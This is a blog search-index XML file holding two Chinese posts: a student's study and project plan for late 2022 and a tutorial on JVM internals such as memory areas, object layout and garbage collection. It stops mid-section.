<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022下半年目标&amp;项目&amp;学习方向&amp;总结</title>
      <link href="/2022/08/26/goals-of-the-second-half-of-2022/"/>
      <url>/2022/08/26/goals-of-the-second-half-of-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="2022下半年目标-amp-项目-amp-学习方向-amp-总结"><a href="#2022下半年目标-amp-项目-amp-学习方向-amp-总结" class="headerlink" title="2022下半年目标&amp;项目&amp;学习方向&amp;总结"></a>2022下半年目标&amp;项目&amp;学习方向&amp;总结</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><blockquote><p>总之尽可能的多完成几个吧</p></blockquote><ul><li><input disabled="" type="checkbox"> 将我的轻薄本系统刷成Manjaro Linux Gnome (在那之前先换一张阳间一点的无线网卡)</li><li><input disabled="" type="checkbox"> 学Android framework层源码，至少要学到一个自己觉得相对满意的位置</li><li><input disabled="" type="checkbox"> 学Linux内核，同上</li><li><input disabled="" type="checkbox"> 给自己手机刷上Magisk，还可以用LSPosed玩一些hook的骚操作</li><li><input disabled="" type="checkbox"> 不要挂科</li><li><input disabled="" type="checkbox"> 享受自己的大学生活</li></ul><h2 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h2><ul><li><input disabled="" type="checkbox"> EmoticonC<ul><li>类似Hall of fame的表情包管理App，不过管理的是Telegram的表情包，支持一键发送到qq/微信/飞书</li><li>后端使用Golang开发</li></ul></li></ul><h2 id="学习方向"><a href="#学习方向" class="headerlink" title="学习方向"></a>学习方向</h2><ul><li>主要方向<ul><li>Android framework</li><li>某些旁门左道(字节码插桩，注解处理，hook)</li><li>Linux 操作/内核/应用开发</li></ul></li><li>兴趣使然的次要方向<ul><li>Golang web</li><li>Rust</li><li>Machine Learning</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>今年结束我会来补上的</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅入浅出JVM</title>
      <link href="/2022/07/31/simple-in-simple-out-jvm/"/>
      <url>/2022/07/31/simple-in-simple-out-jvm/</url>
      
        <content type="html"><![CDATA[<h1 id="浅入浅出JVM-amp-Hook"><a href="#浅入浅出JVM-amp-Hook" class="headerlink" title="浅入浅出JVM &amp; Hook"></a>浅入浅出JVM &amp; Hook</h1><blockquote><p>其中混杂有相当多的个人理解，如有谬误烦请学长指正</p></blockquote><h2 id="什么是JVM"><a href="#什么是JVM" class="headerlink" title="什么是JVM"></a>什么是JVM</h2><p><strong>Java Virtual Machine</strong>，即Java虚拟机。那么虚拟机又是什么？</p><blockquote><p>虚拟机（Virtual Machine）指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。</p></blockquote><p>但不同于其他虚拟机的是，JVM模拟的是一个无法直接在硬件设备上安装的计算机系统——究其根本，它就是一个在各个系统中具有基本相同行为的<strong>跨平台程序</strong>，它提供了一系列可供Java语言调用的API，而这些API都可以溯源到<strong>本地方法</strong>(也就是native修饰的方法)。这些方法在native语言层面实现，且在不同的系统上有着不同逻辑的实现。但抽象到java语言层面，它们的作用是一致的。</p><p>就这样，JVM为我们在各个系统提供了一个具有统一“系统“的虚拟机环境，我们不需要让外部的实际系统认识我们的编译出来的软件，我们只需要让JVM认识它就可以了。每当我们使用<code>java -jar</code>命令运行一个jar文件, 实际上都先运行了JVM，再由JVM来<strong>运行时</strong>的解释并加载jar包中的类文件，并通过META-INF中的主类信息找到主类并执行其中的main方法。</p><p>因此，我们使用Java等依赖于JVM的语言编写程序时如果只调用Java语言为我们提供的API，我们编写的代码就可以在一切支持JVM的系统上运行。正所谓 <em><strong>Write once, run anywhere</strong></em>。你会发现很多直接编译为native的语言(C, C++, Rust, Go…)甚至需要在对应的系统编译才能运行，这也正是JVM系语言相对于其他语言的优势之一。</p><h2 id="JVM的种类"><a href="#JVM的种类" class="headerlink" title="JVM的种类"></a>JVM的种类</h2><p>这里介绍主要的几种</p><h3 id="Sun-Classic-VM"><a href="#Sun-Classic-VM" class="headerlink" title="Sun Classic VM"></a>Sun Classic VM</h3><blockquote><p>万物伊始</p></blockquote><p>其中使用的技术在今天看来已经相当原始，这款虚拟机的使命也早已终结，但凭它”世界上第一款商用Java虚拟机“的头衔，便足以让它被历史铭记。</p><h3 id="HotSpot-VM"><a href="#HotSpot-VM" class="headerlink" title="HotSpot VM"></a>HotSpot VM</h3><blockquote><p>武林盟主</p></blockquote><p>毫无疑问是当今被最广泛使用的Java虚拟机</p><h3 id="Graal-VM"><a href="#Graal-VM" class="headerlink" title="Graal VM"></a>Graal VM</h3><blockquote><p>明日之星</p></blockquote><p>创造性的将字节码编译为另一种中间媒介，同时支持将其他语言编译为这种中间媒介，实现多语言之间的相互调用，JVM将不再专属于字节码。举个例子，我们甚至可以在Java中使用Node.js的Express框架来开发后端程序。</p><h3 id="Dalvik-VM"><a href="#Dalvik-VM" class="headerlink" title="Dalvik VM"></a>Dalvik VM</h3><blockquote><p>为Android而生</p></blockquote><blockquote><p>Dalvik是<a href="https://baike.baidu.com/item/Google/86964">Google</a>公司自己设计用于Android平台的<a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E6%9C%BA/104440">虚拟机</a>。Dalvik虚拟机是Google等厂商合作开发的Android移动设备平台的核心组成部分之一。它可以支持已转换为 .dex（即Dalvik Executable）格式的Java应用程序的运行，.dex格式是专为Dalvik设计的一种<a href="https://baike.baidu.com/item/%E5%8E%8B%E7%BC%A9%E6%A0%BC%E5%BC%8F/2844535">压缩格式</a>，适合内存和处理器速度有限的系统。Dalvik 经过优化，允许在有限的内存中同时运行多个虚拟机的实例，并且每一个Dalvik 应用作为一个独立的Linux 进程执行。独立的进程可以防止在虚拟机崩溃的时候所有程序都被关闭。</p><p>很长时间以来，Dalvik虚拟机一直被用户指责为拖慢安卓系统运行速度不如IOS的根源。</p><p>2014年6月25日，Android L 正式亮相于召开的谷歌I/O大会，Android L 改动幅度较大，<a href="https://baike.baidu.com/item/%E8%B0%B7%E6%AD%8C/117920">谷歌</a>将直接删除Dalvik，代替它的是传闻已久的ART。</p></blockquote><h3 id="ART"><a href="#ART" class="headerlink" title="ART"></a>ART</h3><blockquote><p>ART(Android Runtime)是Android 4.4发布的，用来替换Dalvik虚拟，Android 4.4之前默认采用的还是DVM，系统会提供一个选项来开启ART模式。在Android 5.0时，默认采用ART，DVM从此退出历史舞台。</p></blockquote><p><strong>Dalvik虚拟机执行的是dex字节码，ART虚拟机执行的是本地机器码。</strong></p><blockquote><p>Dalvik执行的是dex字节码，依靠JIT编译器去解释执行，运行时动态地将执行频率很高的dex字节码翻译成本地机器码，然后在执行，但是将dex字节码翻译成本地机器码是发生在应用程序的运行过程中，并且应用程序每一次重新运行的时候，都要重新做这个翻译工作，因此，即使采用了JIT，Dalvik虚拟机的总体性能还是不能与直接执行本地机器码的ART虚拟机相比。 安卓运行时从Dalvik虚拟机替换成ART虚拟机，并不要求开发者重新将自己的应用直接编译成目标机器码，也就是说，应用程序仍然是一个包含dex字节码的apk文件。所以在安装应用的时候，dex中的字节码将被编译成本地机器码，之后每次打开应用，执行的都是本地机器码。移除了运行时的解释执行，效率更高，启动更快。（安卓在4.4中发布了ART运行时）</p></blockquote><p>ART优点:</p><ul><li>系统性能显著提升</li><li>应用启动更快、运行更快、体验更流畅、触感反馈更及时</li><li>续航能力提升</li><li>支持更低的硬件</li></ul><p>ART缺点:</p><ul><li>更大的存储空间占用，可能增加10%-20%</li><li>更长的应用安装时间</li></ul><blockquote><p>应廖老师的要求，讲讲ART的GC</p></blockquote><p>// TODO 内容好多，我太难了</p><h2 id="自行编译JDK8"><a href="#自行编译JDK8" class="headerlink" title="自行编译JDK8"></a>自行编译JDK8</h2><p>非常麻烦，看看有没有时间去做。自行编译jvm可以对jvm打断点，还是很有帮助的。</p><p>// TODO</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>对于从事C，C++程序开发的开发人员，在内存管理领域，他们需要手动分配/释放内存。虽然这是一件繁琐的工作，但这也使C++等一系列需要手动管理内存的语言能做到更多的事情。例如MMKV，它的底层原理使用C++实现——手动管理了一块堆外内存。(但其实Java也并非做不到这个，Unsafe类中提供了手动分配/释放堆外内存的方法，并且提供了跟C++一样的面向指针的操作方法。)</p><p>得益于JVM强大的内存管理机制，JVM语言程序员不需要手动为每个对象分配/释放堆内存，一切看起来相当美好。但正是因为我们将内存管理的程序交给了JVM，一旦出现内存泄漏的问题，如果不清楚JVM内存管理机制的原理就很难解决问题。</p><h3 id="运行时数据区"><a href="#运行时数据区" class="headerlink" title="运行时数据区"></a>运行时数据区</h3><p>Java虚拟机在执行Java程序的过程中会把它管理的内存划分为若干个不同的数据区域:</p><p><img src="http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png" alt="Java虚拟机运行时数据区"></p><h4 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h4><p>程序计数器占用了比较小的一块内存空间，可以看作是<strong>当前线程</strong>所执行字节码的行号(字节码的行号，不是代码的行号，字节码应该包含有对应代码行数的信息)指示器。字节码解释器在工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令, 它是<strong>程序控制流</strong>的指示器，流程控制，异常处理，线程恢复都需要依赖它来实现。</p><p>Java虚拟机的多线程是通过<strong>线程轮流切换，分配处理器时间</strong>实现的，因此在任何一个确定的时刻，一个内核都只会执行一条线程中的指令（即并发执行)。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个程序计数器。因此程序计数器是<strong>线程私有</strong>的。</p><p><strong>—这里稍微讲讲Java的线程调度 &amp; 协程—</strong></p><p>这里引用一段别人的话，上面我可能表述得不是很准确</p><blockquote><p>因为Java的多线程也是依靠时间片轮转算法进行的，因此一个CPU同一时间也只会处理一个线程，当某个线程的时间片消耗完成后，会自动切换到下一个线程继续执行，而当前线程的执行位置会被保存到当前线程的程序计数器中，当下次轮转到此线程时，又继续根据之前的执行位置继续向下执行。</p></blockquote><blockquote><p><strong>单核</strong>的CPU是一种假的多线程，因为在一个时间单元内，也只能执行一个线程的任务。同时间段内有多个线程需要CPU去运行时，CPU也只能交替去执行多个线程中的一个线程，但是由于其执行速度特别快，因此感觉不出来。</p></blockquote><p>按照上面的说法，我们发现，其实线程可以看作一个任务，<strong>内核一直在很多线程之间反复横跳</strong>: 这个做一会儿就停下来，去做下一个。</p><p>但这里就会出现一个问题，使用<code>Thread.sleep(long)</code>停下的线程，内核会怎么办？答案是仍然会到他身上去，但什么也不做，就白白浪费了给cpu分配的时间分片。这就是这种设计的局限性，且不说创建一个新的线程相当占内存，即便是内存足够，并发效率也相当差（其实跟Java当时刚出的时候的其他语言比起来已经很不错了）。线程池当然也会有这个问题。</p><p>那么理想的状态是什么呢？我让这个线程休眠了，你cpu就不要管他，把时间分给其他有任务的线程。</p><p>两条路，要么你从内核层面去改良，去教cpu做事。对应了<code>Thread#yield()</code>,让当前线程把自己的时间让给其他线程，实现<strong>抢占式调度</strong>。</p><p>另外一条道路就是协程，从用户层面改良，cpu教我做事。</p><blockquote><p>如果你觉得Thread#sleep会浪费并发效率，那你就不要用！你要提交能充分利用我效率的任务，而不是一味的谩骂和指责。</p><p>​                                                                                                                                                                                —— CPU</p></blockquote><p>既然<code>Thread.sleep()</code>会导致并发效率低下，那我就不用！在线程下面再区分出来一个协程的概念，在这里把无用的任务过滤一遍，再交给线程。这样每个内核对每个线程的利用率就提高了，也可以提高并发效率。</p><p>是不是感觉java的线程也挺像协程的:)，之前蔷神讲协程也说过线程也可以看成协程的一种实现。我个人觉得他们唯一不同的地方就在于线程是由内核来调度，处于<strong>内核态</strong>，协程由用户编写的逻辑进行调度，处于<strong>用户态</strong>。协程其实是减少了内核的<strong>无用的</strong>工作量，所以并发吞吐量更大。</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-161709.jpg"></p><p><strong>—私货结束—</strong></p><p>程序计数器是JVM唯一一个不会产生OOM的内存区域。</p><blockquote><p>在执行Java方法时，程序计数器的值为正在执行的虚拟机字节码指令的地址</p><p>在执行本地方法时，程序计数器的值为空(undefined)</p></blockquote><h4 id="虚拟机栈"><a href="#虚拟机栈" class="headerlink" title="虚拟机栈"></a>虚拟机栈</h4><p>其实大家应该都知道所谓堆和栈的概念吧。即便Jvm的堆和栈你没有了解过，在C/C++课上应该也了解过堆栈的概念吧？虽然C++这种直接编译到native的语言中的堆和栈与Jvm语言中的堆和栈并不是一个东西——JVM是virtual machine，是虚拟机，它的一切特性都是软件模拟的。C++中我们执行程序直接使用硬件的堆栈，而Java我们执行程序使用JVM为我们模拟出来的堆栈。</p><p>与程序计数器一样，虚拟机栈也是线程私有的, 它的生命周期与线程相同，随线程的释放而释放。每当一个方法被调用，虚拟机都会同步创建一个栈帧用于存储<strong>局部变量表，操作数栈，动态连接，方法出口</strong>等信息。每一个方法从调用到返回的过程就对应着一个栈帧入栈到出栈的过程。</p><p>这里从别人那里抄来了一个流程图解</p><blockquote><p>可能听起来有点懵逼，这里我们来模拟一下整个虚拟机栈的运作流程，先编写一个测试类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&gt;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>       <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们的主方法执行后，会依次执行三个方法<code>a() -&gt; b() -&gt; c() -&gt; 返回</code></p><p>可以看到在编译之后，我们整个方法的最大操作数栈深度、局部变量表都是已经确定好的，当我们程序开始执行时，会根据这些信息封装为对应的栈帧，我们从<code>main</code>方法开始看起：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg" alt="image-20220131142625842"></p><p>接着我们继续往下，调用方法<code>a()</code>，这时当前方法就不会继续向下运行了，而是去执行方法<code>a()</code>，那么同样的，将此方法也入栈，注意是放入到栈顶位置，<code>main</code>方法的栈帧会被压下去：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg" alt="image-20220131143641690"></p><p>这时，进入方法a之后，又继而进入到方法b，最后在进入c，因此，到达方法c的时候，我们的虚拟机栈变成了：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg" alt="image-20220131144209743"></p><p>现在我们依次执行方法c中的指令，最后返回a+b的结果，在方法c返回之后，也就代表方法c已经执行结束了，栈帧4会自动出栈，这时栈帧3就得到了上一栈帧返回的结果，并继续执行，但是由于紧接着马上就返回，所以继续重复栈帧4的操作，此时栈帧3也出栈并继续将结果交给下一个栈帧2，最后栈帧2再将结果返回给栈帧1，然后栈帧1就可以继续向下运行了，最后输出结果。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg" alt="image-20220131144955668"></p></blockquote><p>虚拟机栈并不是无限大的，如果其中堆积的栈帧数量太多就会<strong>爆栈</strong>(StackOverFlowException)，我们可以通过<code>-Xss size</code>的vm options设置虚拟机的栈大小。</p><p>常见关于虚拟机栈的问题:</p><p>垃圾回收是否涉及栈内存？</p><ul><li><strong>不涉及</strong>，垃圾回收只涉及堆内存。在方法返回后其对应的栈帧就会出栈，所以不需要回收内存。</li></ul><p>栈内存分配得越大越好吗?</p><ul><li><strong>不</strong>，栈内存大了，其他的内存区域就小了。有时你对递归调用并没有这么大的需求，毕竟所有的递归调用都可以通过循环实现。</li></ul><h4 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h4><p>本地方法栈其实跟虚拟机栈的作用非常相似，只是他们一个为字节码层面的方法服务，一个为本地方法服务。</p><h4 id="Java堆"><a href="#Java堆" class="headerlink" title="Java堆"></a>Java堆</h4><p>Java堆是虚拟机管理的内存中最大的一块, 用来存放对象实例。也是GC的主战场。不同于以上几个区域，Java堆是线程间共享的。所以在访问堆中存储的数据需要注意线程安全问题。</p><h4 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h4><p>与Java堆一样是线程间共享的区域，它主要用于存储已经被虚拟机加载的<strong>类型信息，常量，静态变量，即时编译器编译后的代码缓存</strong>。虽然《Java虚拟机规范》中把方法区描述为堆的一个逻辑部分，但它却有一个别名叫做“非堆”(Non-Heap)，目的是与Java堆区分开来。</p><p>你可能会听说方法区就是堆的永久代这个说法，实际不是这样的。仅仅只是因为HotSpot VM选择使用永久代来实现方法区，但实际上这是两个完全不同的概念。</p><blockquote><p>可能看起来有点突兀，只是写到这里的时候突然想说一下JIT（即时编译器）的工作流程</p><p>这里可以发现其实jvm并非单纯解释执行字节码，而是在解释量达到一定阈值后触发即时编译，将编译后的字节码缓存到方法区，下次调用时便可以直接执行编译后的机器码。（也就是说常用的方法会被缓存为机器码）</p><p><img src="https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg" alt="img"></p></blockquote><p><strong>运行时常量池</strong></p><p>运行时常量池是方法区的一部分。在类加载时JVM读取class文件中常量池表的信息，并把它存入运行时常量池。至于常量池表，下面我们讲字节码的时候再详细介绍，现在我们只需要知道它是存放程序运行所需的常量即可。</p><p>而运行时常量池的另外一个重要特征就是具备<strong>动态性</strong>，Java并不要求常量一定只有在编译期才能产生，这点与c++不同，运行期间也可以有新的常量进入常量池。这种特性被开发人员利用得比较多的就是<code>String#intern()</code>方法。</p><blockquote><p>关于String#intern方法，直接使用双引号声明的字符串都会直接存储在常量池中</p><p>而非通过双引号声明出来的字符串可以使用String#intern方法查询常量池中是否存在该字符串，若不存在就会将其放入常量池</p><p>是不是又可以理解java的字符串对象为什么不可变了，因为我们一般获取的字符串都会存储在常量池中，如果直接对字符串对象动刀岂不是没有意义了</p><p>这也是为什么不推荐直接通过String的构造方法获得一个String对象的原因，因为这样会new出来一个新对象，而非存储在常量池中的字符串</p></blockquote><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><h4 id="创建对象大致流程"><a href="#创建对象大致流程" class="headerlink" title="创建对象大致流程"></a>创建对象大致流程</h4><h5 id="类加载检查"><a href="#类加载检查" class="headerlink" title="类加载检查"></a>类加载检查</h5><p>当jvm遇到一条字节码new指令的时候，首先将会检查这个指令的参数是否能在常量池定位到一个类的符号引用，并且检查这个符号引用代表的类是否已经被加载，解析和初始化过。如果没有，先执行相应的类加载过程。</p><h5 id="分配内存"><a href="#分配内存" class="headerlink" title="分配内存"></a>分配内存</h5><ul><li>指针碰撞</li></ul><p>​    在Java堆规整的情况下（所有对象的地址连续），为新对象分配内存只需要把指针向空闲区域移动</p><ul><li>空闲列表</li></ul><p>​    在Java堆内存存放分散的情况下，我们必须维护一个列表，记录哪些内存块是可用的，分配内存时从列表中找到合适的内存块，并更新表上的记录。</p><p><strong>分配内存这个过程需要保证线程安全</strong>，一般采取两种做法: </p><ul><li>对分配内存空间的动作进行同步处理——实际上虚拟机是采用CAS配上失败重试的方式保证更新操作的原子性</li><li>为每条线程预先分配一块堆内存，即本地线程分配缓冲，哪个线程要分配内存，就在哪个线程的本地缓冲区分配。本地缓冲区消耗完了才会锁同步。</li></ul><h5 id="初始化内存空间"><a href="#初始化内存空间" class="headerlink" title="初始化内存空间"></a>初始化内存空间</h5><p>即为对象的成员变量赋初值，没有赋初值的初始化为类型对应零值（引用类型对应null）</p><h5 id="初始化对象头-Object-Header"><a href="#初始化对象头-Object-Header" class="headerlink" title="初始化对象头 (Object Header)"></a>初始化对象头 (Object Header)</h5><p>Java虚拟机需要对对象进行必要的设置，例如这个对象是哪个类的实例，如何才能找到类的元数据信息，对象的hash code(实际上会延后到调用<code>Object#hashCode()</code>才会计算)，对象的GC分代年龄等信息，这些信息会存放在对象的<strong>对象头</strong>中。</p><h5 id="调用构造器"><a href="#调用构造器" class="headerlink" title="调用构造器"></a>调用构造器</h5><p>使用正常途径新建对象必不可少的环节，当然使用<code>Unsafe#allocateInstance()</code>创建对象是可以跳过这一步的。(Gson的反序列化出来的对象就是使用它新建的，所以说它不适合Kt，因为Kt的空安全检查逻辑实际上是写在构造器里的，Gson这样做直接跳过了空安全检查)</p><h4 id="对象的内存布局"><a href="#对象的内存布局" class="headerlink" title="对象的内存布局"></a>对象的内存布局</h4><p>在HotSpot虚拟机中，对象在堆内存中的储存布局可以划分为三个部分: 对象头(Header)，实例数据(Instance Data)和对齐填充(Padding)。</p><p>对象头中包含两类信息: 第一类是用于存储对象自身的运行时数据，如HashCode，GC分代年龄，锁状态标志，线程持有的锁，偏向线程ID，偏向时间戳等，这部分数据的长度在32位和64位的虚拟机中分别为32和64个bit，官方称它为“Mark World”。</p><p>实例数据部分是对象真正存储的有效信息，即我们在程序代码中所定义的字段等内容</p><p>对齐填充部分只是起到一个占位符的作用，由于HotSpot虚拟机的自动内存管理系统要求对象起始地址必须是8字节的整数倍，也就是说任何对象的大小都必须是8字节的倍数。对象头部分已经被精心设计为8字节的倍数（1倍或2倍）。因此，如果对象实例数据部分没有对齐的话，就需要通过对齐填充来补全。</p><h4 id="对象的访问定位"><a href="#对象的访问定位" class="headerlink" title="对象的访问定位"></a>对象的访问定位</h4><p>创建对象自然是为了使用对象，我们的java程序一般通过栈上保存的<strong>reference</strong>(即引用)来操作堆上的具体对象。但Java虚拟机规范中只规定了这个reference类型是一个指向对象的引用，并没有强制要求这个引用应该如何定位，访问对象。所以对象访问方式也是由虚拟机实现而定的，主流的访问方式主要有使用<strong>句柄</strong>和<strong>指针</strong>。</p><h5 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h5><blockquote><p> 如果使用句柄访问的话，Java堆中将可能划分出一块内存来作为句柄池，reference中存储的就是对象的句柄地址，而句柄中包含了对象的实例数据与类型数据各自具体的地址信息</p></blockquote><p>使用句柄来访问的最大好处是reference中存储的是稳定的句柄地址，在对象被移动（GC时移动是很普遍的行为）时只会改变句柄中的实例数据指针，而reference本身不需要被修改。</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png" alt="飞书20220708-221205"></p><h5 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h5><blockquote><p>如果直接使用指针访问的话，Java堆中对象的内存布局就必须考虑如何放置访问类型的相关信息，reference中存储的直接就是对象地址，如果只是访问对象本身的话，就不需要多一次访问的开销。</p></blockquote><p>直接使用指针访问的好处在与速度快，它节省了一次指针定位的开销，由于对象访问在java中非常频繁，这笔开销相当不容小觑。<strong>HotSpot</strong>虚拟机采用指针访问</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png" alt="飞书20220708-221128"></p><h3 id="垃圾回收-GC"><a href="#垃圾回收-GC" class="headerlink" title="垃圾回收 (GC)"></a>垃圾回收 (GC)</h3><p>大家应该都知道这个东西，我就不介绍了，直接切入正题</p><h4 id="引用计数算法-amp-可达性分析算法"><a href="#引用计数算法-amp-可达性分析算法" class="headerlink" title="引用计数算法 &amp; 可达性分析算法"></a>引用计数算法 &amp; 可达性分析算法</h4><p>在堆中存放着Java世界中几乎所有的对象实例，垃圾收集器在堆中进行回收前，第一件事就是要确定这些对象之中还有哪些”存活“着，哪些已经“死去”。下面就讲一讲比较常见的两种判断的方法。</p><h5 id="引用计数算法"><a href="#引用计数算法" class="headerlink" title="引用计数算法"></a>引用计数算法</h5><p>在对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就+1，引用失效时，计数器值就-1。任何时候计数器为0的对象是不可能再使用的，可以直接回收。</p><p>虽然引用计数法简单高效，在大多数情况下是一个不错的算法。但主流的Java虚拟机并没有采用引用计数法进行内存管理，因为这个算法需要处理大量的意外情况——比如循环引用。</p><h5 id="可达性分析算法"><a href="#可达性分析算法" class="headerlink" title="可达性分析算法"></a>可达性分析算法</h5><p>当前主流的商用应用语言（Java，C#等）的内存管理子系统都是通过<strong>可达性分析</strong>算法来判定对象是否存活。这个算法的基本思路就是通过一系列称为<strong>GC Roots</strong>的根对象作为起始节点集，从这些节点开始，根据引用关系向下搜索，搜索过程中走过路径称为<strong>引用链</strong>，如果某个对象到GC Roots间没有任何引用链相连，则该对象<strong>不可达</strong>，就会被判定为可回收的对象。</p><p>可作为GC Roots的对象:</p><ul><li>在虚拟机栈中引用的对象</li><li>方法区中类静态属性引用的对象 （例如Java的引用类型静态变量）</li><li>方法区中常量引用的对象 （例如字符串常量池中的引用）</li><li>在本地方法栈中JNI引用的对象</li><li>Java虚拟机内部的引用，如<strong>基本数据类型对应的Class对象</strong>，一些常驻的异常对象（如NullPointerException）等，还有系统类加载器。</li></ul><p><img src="https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h4 id="引用的类型"><a href="#引用的类型" class="headerlink" title="引用的类型"></a>引用的类型</h4><p>实际上GC的回收策略并不死板，在剩余内存较少的时候，GC会尽可能回收多的对象来腾出更多的内存空间。那么我们要如何规定在剩余内存较少的时候才需要回收的那部分对象呢？于是在JDK1.2之后，Java对引用的概念进行了扩充，将引用分为<strong>强引用，软引用，弱引用，虚引用</strong>四种类型。</p><h5 id="强引用"><a href="#强引用" class="headerlink" title="强引用"></a>强引用</h5><p>最传统的引用定义，指程序代码中普遍存在的引用赋值。只要强引用关系存在，GC就不会回收被引用的对象。</p><h5 id="软引用"><a href="#软引用" class="headerlink" title="软引用"></a>软引用</h5><p>软引用用来描述一些还需要用到，但非必须的对象，在内存不足时，GC会回收掉只被软引用关联的对象。可以使用<code>SoftReference</code>类来实现软引用。</p><h5 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h5><p>只被弱引用关联的对象只能存活到下一次GC到来前。可以使用<code>WeakReference</code>类来实现弱引用。</p><h5 id="虚引用"><a href="#虚引用" class="headerlink" title="虚引用"></a>虚引用</h5><p>相当于没有引用，也没有办法通过这种引用得到关联的对象，为一个对象设置虚引用的唯一目的就是为了能在对象被回收时收到通知。可以使用<code>PhantomReference</code>类来实现虚引用。</p><h4 id="垃圾收集算法"><a href="#垃圾收集算法" class="headerlink" title="垃圾收集算法"></a>垃圾收集算法</h4><h5 id="分代收集理论"><a href="#分代收集理论" class="headerlink" title="分代收集理论"></a>分代收集理论</h5><p>实际上，如果我们对堆中的每一个对象都依次判断是否需要回收，这样的效率其实是很低的，那么有没有更好地回收机制呢？第一步，我们可以对堆中的对象进行分代管理。</p><p>比如某些对象，在多次垃圾回收时，都未被判定为可回收对象，我们完全可以将这一部分对象放在一起，并让垃圾收集器减少回收此区域对象的频率，这样就能很好地提高垃圾回收的效率了。</p><p>因此，Java虚拟机将堆内存划分为<strong>新生代</strong>、<strong>老年代</strong>和<strong>永久代</strong>（其中永久代是HotSpot虚拟机特有的概念，在JDK8之前方法区实际上就是采用的永久代作为实现，而在JDK8之后，方法区由元空间实现，并且使用的是本地内存，容量大小取决于物理机实际大小，之后会详细介绍）这里我们主要讨论的是<strong>新生代</strong>和<strong>老年代</strong>。</p><p>不同的分代内存回收机制也存在一些不同之处，在HotSpot虚拟机中，新生代被划分为三块，一块较大的Eden空间和两块较小的Survivor空间，默认比例为8：1：1，老年代的GC评率相对较低，永久代一般存放类信息等（其实就是方法区的实现）如图所示：</p><p><img 